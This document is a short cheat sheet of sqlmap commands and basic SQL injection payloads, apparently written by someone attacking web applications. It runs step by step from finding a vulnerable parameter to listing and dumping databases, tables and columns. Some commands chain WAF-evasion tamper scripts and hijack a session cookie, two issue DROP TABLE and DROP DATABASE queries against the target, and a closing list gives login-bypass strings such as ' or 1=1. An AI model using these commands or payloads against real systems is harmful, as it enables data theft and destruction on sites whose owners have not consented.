# SQLMAP

1. yoursite.com/news.php?id=1
2. python2 sqlmap.py "yoursite.com/news.php?id=1" --dbs
3. python2 sqlmap.py "yoursite.com/news.php?id=1" --tables -D yoursite
4. python2 sqlmap.py "yoursite.com/news.php?id=1" --columns -D databasename -T tablename
5. python2 sqlmap.py "yoursite.com/news.php?id=1" --dump -D databasename -T tablename
6. python2 sqlmap.py "yoursite.com/news.php?id=1" --level=5 --risk=3 --dbs
7. python2 sqlmap.py "yoursite.com/news.php?id=1" --cookie='PHPSESSID=gsi3k0dblqj5tj8arcptqs73bi' --dbs --batch --dump --tables --columns --tamper=between,bluecoat,equaltolike,greatest,ifnull2ifisnull,modsecurityzeroversioned,multiplespaces,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --level 5 --dbms=mysql
8. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent
9. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --dbs
10. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent -D tes3 --tables
11. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent -D tes3 -T coba --dump
12. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --sql-query "DROP TABLE nama_tabel"
13. python sqlmap.py -r request4.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --sql-query "DROP DATABASE nama_database"
14. python3 sqlmap.py -r request.txt -t 10 --tamper="between,randomcase,space2comment" --random-agent --dbs --level=5 --risk=3 --threads=5 --hex --data="id=2618 AND 2323=2323" --dbms=Oracle

// others
python sqlmap.py -u "https://target.com/?id=1" -t 10 --tamper="between,randomcase,space2comment" --dbs --random-agent --risk=3 --level=5

// set parameter target
sqlmap -r ./target.txt --tamper="between,randomcase,space2comment" --random-agent -p username,password


# SQL Injection basics
1. '+OR+1=1-- (microsoft)
2. administrator'--
3. ' or 1=1 limit 1 -- -+
4. ' or 1=1 LIMIT 1 OFFSET 2 -- -+

Reference : 
1. https://sangtopihitam.blogspot.com/2020/02/tutorial-install-sqlmap-dan-cara.html
2. https://hackertarget.com/sqlmap-tutorial/
